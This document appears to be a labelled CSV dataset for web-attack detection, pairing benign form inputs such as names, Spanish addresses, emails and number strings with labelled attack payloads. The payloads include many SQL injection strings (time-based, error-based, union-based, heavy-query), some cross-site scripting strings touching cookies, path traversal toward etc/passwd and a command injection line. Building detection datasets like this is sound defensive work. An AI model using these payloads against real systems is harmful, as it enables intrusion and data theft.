payload,length,attack_type,label
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli,anom
costello_browallius@autoconstruccion.bt,39,norm,norm
strom.mahieuy4@karldeux.ac,26,norm,norm
condensador,11,norm,norm
yamasaki@multaspendientes.eg,28,norm,norm
corrales de duero,17,norm,norm
valle de yerri/deierri,22,norm,norm
36432557m,9,norm,norm
1))) and 9198=9198--,20,sqli,anom
"-1512 union all select 9013,9013,9013,9013#",43,sqli,anom
ajmet,5,norm,norm
61929820c,9,norm,norm
6,1,norm,norm
6162508820566713,16,norm,norm
"1"") where 3826=3826;select count(*) from generate_series(1,5000000)--",69,sqli,anom
0379584529465876,16,norm,norm
thiele@edifico.kp,17,norm,norm
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",131,sqli,anom
"1"")) union all select null,null,null,null,null--",48,sqli,anom
abdala,6,norm,norm
58743816e,9,norm,norm
delit@icods.ro,14,norm,norm
waldemar,8,norm,norm
fany,4,norm,norm
abla,4,norm,norm
"1'+(select 'ayod' where 7839=7839 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",191,sqli,anom
1'+(select 'gprq' where 8928=8928;waitfor delay '0:0:5'--,57,sqli,anom
1%') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'=',218,sqli,anom
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)",67,sqli,anom
"1')) as lxjs where 6503=6503 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",160,sqli,anom
1%' and 8594=(select 8594 from pg_sleep(5))--,45,sqli,anom
3823811440410539,16,norm,norm
"1'+(select 'ycsv' where 3628=3628 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",174,sqli,anom
cangalaya,9,norm,norm
"praza francisco fernandez del riego, 131",40,norm,norm
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",74,sqli,anom
7745667684469889,16,norm,norm
85744372g,9,norm,norm
2424,4,norm,norm
lindon,6,norm,norm
i91ro21rc197a1o,15,norm,norm
guell lloret,12,norm,norm
"1)) or 8156=(select count(*) from generate_series(1,5000000))--",63,sqli,anom
orbita,6,norm,norm
trbena,6,norm,norm
morosa,6,norm,norm
1'+(select pagd where 2484=2484;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,96,sqli,anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('fdoc' like 'fdoc",230,sqli,anom
-5432') as dndq where 9633=9633 order by 1#,43,sqli,anom
josu,4,norm,norm
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",75,sqli,anom
"-3109"" or elt(1032=1032,3623)",29,sqli,anom
"""javascript:alert(1)""><input type=submit>",41,xss,anom
19311,5,norm,norm
beninger,8,norm,norm
17486,5,norm,norm
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",120,sqli,anom
49540097y,9,norm,norm
"1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--",77,sqli,anom
1940931931153821,16,norm,norm
/iii{file},10,path-traversal,anom
-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,216,sqli,anom
badosa estruch,14,norm,norm
banyeres del peneds,19,norm,norm
"romejal carrascal, 48, 3?d",26,norm,norm
"1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--",96,sqli,anom
"garrotxa, 118",13,norm,norm
2651,4,norm,norm
ge2613an0,9,norm,norm
60219106t,9,norm,norm
poligono galiana 114,20,norm,norm
"c/ doctor santero, 126 6-g",26,norm,norm
mohedas de granadilla,21,norm,norm
glatzeder.karr@lamejorplaya.so,30,norm,norm
nix@quecole.vc,14,norm,norm
anguciana,9,norm,norm
greco_manon1@hacia.yu,21,norm,norm
dailey@flabingo.gw,18,norm,norm
evangelino,10,norm,norm
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,103,sqli,anom
90907663w,9,norm,norm
5259660554384998,16,norm,norm
9528603304738849,16,norm,norm
01212,5,norm,norm
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykxz'='ykxz",129,sqli,anom
">""<img src=""mocha:document.cookie=true;"">",41,xss,anom
iraci,5,norm,norm
"1)) as ctqr where 2609=2609;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",128,sqli,anom
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",170,sqli,anom
/.//././/./{file},17,path-traversal,anom
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",72,sqli,anom
2243286657629383,16,norm,norm
-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,231,sqli,anom
24391,5,norm,norm
magdi,5,norm,norm
1'))) and 7401=9838#,20,sqli,anom
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""layz""=""layz",103,sqli,anom
1%')) rlike sleep(5)#,21,sqli,anom
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""rphs""=""rphs",129,sqli,anom
"c/ huescar 60,",14,norm,norm
"1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",133,sqli,anom
"motril, 131",11,norm,norm
v8s684t29a,10,norm,norm
"-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo",46,sqli,anom
lefaur@ladigianni.md,20,norm,norm
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""ccuy""=""ccuy",118,sqli,anom
7810892855835467,16,norm,norm
"1') as pwqs where 2291=2291;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",124,sqli,anom
"-5866')) as phzq where 3803=3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",91,sqli,anom
claudine,8,norm,norm
paton,5,norm,norm
aguiar claver,13,norm,norm
9raspun9e,9,norm,norm
"<img src=""blah""onmouseover=""document.cookie=true;"">",51,xss,anom
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",96,sqli,anom
1%'))) waitfor delay '0:0:5'--,30,sqli,anom
"calle platerias, 47",19,norm,norm
..................................................etcpasswd,59,path-traversal,anom
"1%')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('%'='",120,sqli,anom
& id,4,cmdi,anom
estupian lladonet,17,norm,norm
"1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",126,sqli,anom
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",56,sqli,anom
ace587,6,norm,norm
adradas,7,norm,norm
"-3852') union all select 3577,3577,3577,3577,3577,3577,3577,3577#",65,sqli,anom
"calle matula, s/n,",18,norm,norm
63102165d,9,norm,norm
guilbert_silver@maquillajeparalabios.dj,39,norm,norm
ucedo ballar,12,norm,norm
sin,3,norm,norm
"1'))) or elt(5873=5873,sleep(5))#",33,sqli,anom
ligurs,6,norm,norm
09899393d,9,norm,norm
"-1015"")) union all select 6624,6624#",36,sqli,anom
"-4972')) as kfzc where 8817=8817 union all select 8817,8817,8817,8817,8817,8817--",81,sqli,anom
71814891j,9,norm,norm
evin,4,norm,norm
amelio,6,norm,norm
rachael,7,norm,norm
"1)) union all select null,null,null,null,null,null,null,null,null--",67,sqli,anom
greenlee,8,norm,norm
madrigal del monte,18,norm,norm
villaeles de valdavia,21,norm,norm
"<iframe id=xss src=""javascript:alert('xss'); <",46,xss,anom
4847935769774930,16,norm,norm
-2920')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rzey'='rzey,207,sqli,anom
turus,5,norm,norm
guijo de santa brbara,21,norm,norm
29283698y,9,norm,norm
koeman0,7,norm,norm
vizcaya,7,norm,norm
1') rlike (select * from (select(sleep(5)))sgvo) and ('lzbn'='lzbn,66,sqli,anom
58052164a,9,norm,norm
gomarov@manuelpaloma.fr,23,norm,norm
lockin.konstantia@modeloscaninos.kn,35,norm,norm
rascel-byatt@discotecateatre.ug,31,norm,norm
a92974d4r,9,norm,norm
macreyno,8,norm,norm
tinajas,7,norm,norm
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>",221,xss,anom
"-6595))) union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",76,sqli,anom
1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--,85,sqli,anom
2111805626623658,16,norm,norm
"-1048%"" or 3038=3038",20,sqli,anom
"-9087"" order by 1#",18,sqli,anom
1';select (case when (1014=4280) then 1014 else 1014*(select 1014 from mysql.db) end)#,86,sqli,anom
cairisti,8,norm,norm
"1%' or 8421=(select count(*) from generate_series(1,5000000)) and '%'='",71,sqli,anom
39580,5,norm,norm
"1%"" or elt(5873=5873,sleep(5))#",31,sqli,anom
70304292p,9,norm,norm
8015,4,norm,norm
s5bal850de,10,norm,norm
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""gcyp"" like ""gcyp",118,sqli,anom
34791026f,9,norm,norm
febrer pedrouzo,15,norm,norm
ostapchuk casal,15,norm,norm
lacey@bwds.mp,13,norm,norm
scriptdocument.cookie=true;/script,34,xss,anom
40170,5,norm,norm
balcom,6,norm,norm
calle de la corua 26 10?h,25,norm,norm
72588518n,9,norm,norm
ondara,6,norm,norm
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli,anom
"1'+(select 'qpxk' where 7139=7139 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",126,sqli,anom
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ugum' like 'ugum",129,sqli,anom
"1' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",97,sqli,anom
3329811136161981,16,norm,norm
aduna,5,norm,norm
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",183,sqli,anom
"1"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",67,sqli,anom
1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',87,sqli,anom
37609,5,norm,norm
15388,5,norm,norm
"-1597"" where 5933=5933 or 3038=3038",35,sqli,anom
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt,86,sqli,anom
rodolphe,8,norm,norm
"gaspar mendez 173, 3-h",22,norm,norm
56,2,norm,norm
40531,5,norm,norm
cuperley@7peines.gu,19,norm,norm
"muelle evaristo churruca, 149 5?e",33,norm,norm
6691710338743371,16,norm,norm
22997473a,9,norm,norm
"1%')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",172,sqli,anom
"1"") where 6018=6018 and 7533=7533--",35,sqli,anom
vega del codorno,16,norm,norm
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""rkry"" like ""rkry",182,sqli,anom
"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",113,sqli,anom
"-2197' union all select 8065,8065,8065,8065--",45,sqli,anom
">""<layer src=""javascript:document.cookie=true;""></layer>",56,xss,anom
serret@sierradealcaraz.dj,25,norm,norm
"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",143,sqli,anom
39419,5,norm,norm
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",93,sqli,anom
san ambrosio 65 6?h,19,norm,norm
es,2,norm,norm
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",173,sqli,anom
31049,5,norm,norm
sheara,6,norm,norm
-3566%' or 2158=6289,20,sqli,anom
mariabel,8,norm,norm
besal,5,norm,norm
52530900g,9,norm,norm
"1') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",98,sqli,anom
braian,6,norm,norm
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",217,sqli,anom
1') and (3020=3020)*6703 and ('botl' like 'botl,47,sqli,anom
murero,6,norm,norm
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('tvar'='tvar",164,sqli,anom
brigida,7,norm,norm
81717068t,9,norm,norm
veh327lo,8,norm,norm
lemunao porxas,14,norm,norm
eflujo,6,norm,norm
62386870z,9,norm,norm
25960678a,9,norm,norm
1) where 7050=7050;waitfor delay '0:0:5'--,42,sqli,anom
9280522239849881,16,norm,norm
renick@piaceredelivery.hn,25,norm,norm
49167,5,norm,norm
"-7971)) as armw where 9474=9474 or make_set(9354=9354,7185)--",61,sqli,anom
"1) as vqbf where 4020=4020;select benchmark(5000000,md5(0x4c4d6142))--",70,sqli,anom
choong,6,norm,norm
hollingw,8,norm,norm
1'+(select 'ueak' where 7329=7329 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))+',223,sqli,anom
'1,2,sqli,anom
mbrose,6,norm,norm
"-7122"") union all select 4002,4002,4002,4002,4002,4002,4002,4002#",65,sqli,anom
"1%"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""%""=""",58,sqli,anom
9173442177715818,16,norm,norm
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",183,sqli,anom
ibero,5,norm,norm
">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",150,xss,anom
av. carlos marx s/n,19,norm,norm
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,69,sqli,anom
"1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'",151,sqli,anom
pedro de la gasca 140,21,norm,norm
-7246'||(select 'qchp' from dual where 8317=8317 order by 1--,61,sqli,anom
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",118,sqli,anom
terencio,8,norm,norm
0095634128871613,16,norm,norm
listeza,7,norm,norm
5558396757589314,16,norm,norm
46177,5,norm,norm
"-2305' in boolean mode) union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",92,sqli,anom
"1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",192,sqli,anom
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",127,xss,anom
"1"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli,anom
70202479q,9,norm,norm
kimberle,8,norm,norm
"-1<img src=""livescript:document.cookie=true;"">",46,xss,anom
"-3505"") where 2340=2340 or 9323=9323#",37,sqli,anom
-8641%' order by 1--,20,sqli,anom
"1%"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""%""=""",101,sqli,anom
or5ina8ia,9,norm,norm
-6222)) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((3230=3230,221,sqli,anom
"-2979')) as klou where 7092=7092 union all select 7092,7092--",61,sqli,anom
salina-sonajew@almeriastella.vg,31,norm,norm
"1) where 5261=5261 and elt(1210=1210,sleep(5))--",48,sqli,anom
1084102116286517,16,norm,norm
daren9,6,norm,norm
zaquiel,7,norm,norm
c40tra3el436,12,norm,norm
cabr,4,norm,norm
kastner.matsuzaka@graficascamp.py,33,norm,norm
86626999y,9,norm,norm
balzo@onlinegratis.lv,21,norm,norm
granfiel,8,norm,norm
1'||(select 'xugb' from dual where 6772=6772;if(7899=7899) select 7899 else drop function zbbp--,96,sqli,anom
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",87,sqli,anom
1'))) and (select * from (select(sleep(5)))fzno) and ((('acml' like 'acml,73,sqli,anom
yong-gomori@andrestabernero.gg,30,norm,norm
"1 or 8466=benchmark(5000000,md5(0x694a4745))-- rlas",51,sqli,anom
iznate,6,norm,norm
"1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",88,sqli,anom
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux,70,sqli,anom
1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||',80,sqli,anom
jalaie,6,norm,norm
(select (case when (3950=2747) then 1 else 1/(select 0) end)),61,sqli,anom
chittell@agroibericaingenieros.vg,33,norm,norm
-7209'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('stqx'='stqx,215,sqli,anom
79,2,norm,norm
rocinante,9,norm,norm
19255762r,9,norm,norm
52181980v,9,norm,norm
"-6363"") where 4043=4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",87,sqli,anom
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",215,sqli,anom
"1)));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",72,sqli,anom
"1';iif(9007=3836,1,1/0)",23,sqli,anom
"ventas de retamosa, las",23,norm,norm
"1)));iif(9190=5059,1,1/0)",25,sqli,anom
"1"")) as azak where 4911=4911;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",120,sqli,anom
duilio,6,norm,norm
marcet bolivar,14,norm,norm
"-4692%"")) union all select 1781,1781#",37,sqli,anom
keehn,5,norm,norm
"1')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",80,sqli,anom
benavente,9,norm,norm
haker-durango@mirallesmoscardo.ro,33,norm,norm
roperuelos del pramo,20,norm,norm
1'||(select 'feyg' from dual where 7734=7734 and 3843=6724#,59,sqli,anom
estolano boget,14,norm,norm
alden@b-sign.sv,15,norm,norm
duo_davalos@designworld.cz,26,norm,norm
ensacad$ora,11,norm,norm
25265,5,norm,norm
yates@tgcprint.ax,17,norm,norm
"1"") where 6897=6897;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli,anom
98089077b,9,norm,norm
"calle goletera 30, 6a",21,norm,norm
1'||(select 'uedk' where 4655=4655;waitfor delay '0:0:5')||',60,sqli,anom
"1%""));select pg_sleep(5)--",26,sqli,anom
quintela de leirado,19,norm,norm
"-2448%"") or 3038=3038",21,sqli,anom
10836981w,9,norm,norm
<script>a=/xss/,15,xss,anom
"calle la caldera, 76 11-c",25,norm,norm
8703,4,norm,norm
barrs obrador,13,norm,norm
"1'+(select 'vjoj' where 5348=5348;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",134,sqli,anom
cortes de la frontera,21,norm,norm
"1)) as rpwt where 4103=4103 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
14835707v,9,norm,norm
ohenry.ridofi2@e-b-s.gr,23,norm,norm
de la poza sansabria,20,norm,norm
trooger_gereighty@quierocortinas.mil,36,norm,norm
41570,5,norm,norm
yoe,3,norm,norm
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli,anom
1) as fhvb where 4008=4008;begin user_lock.sleep(5); end--,58,sqli,anom
cesarin,7,norm,norm
villagomez@nutrimama.uy,23,norm,norm
"c/ misericordia, 57 7-h",23,norm,norm
calle bernat de santa eugenia 90,32,norm,norm
30584367w,9,norm,norm
"-8614') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
4803866422185035,16,norm,norm
5405560424744158,16,norm,norm
-4901) or 3407=6442#,20,sqli,anom
"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>",91,xss,anom
en6l46h636,10,norm,norm
baln,4,norm,norm
"1"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""xhqc""=""xhqc",218,sqli,anom
cavey.cox@directoriogratuito.ec,31,norm,norm
banasts,7,norm,norm
"<div style=""background-image: url(javascript:document.cookie=true;)"">",69,xss,anom
lacavex lafont,14,norm,norm
kwokchoi,8,norm,norm
lezo,4,norm,norm
"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",70,sqli,anom
oblak,5,norm,norm
1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#,201,sqli,anom
27860,5,norm,norm
saj.ador,8,norm,norm
"1%"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",77,sqli,anom
lorain-ligero@mareventsprotocolosocial.tn,41,norm,norm
24711,5,norm,norm
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)# aetd",209,sqli,anom
1%')) union all select null--,29,sqli,anom
vieta,5,norm,norm
599iad12a,9,norm,norm
navalvillar de ibor,19,norm,norm
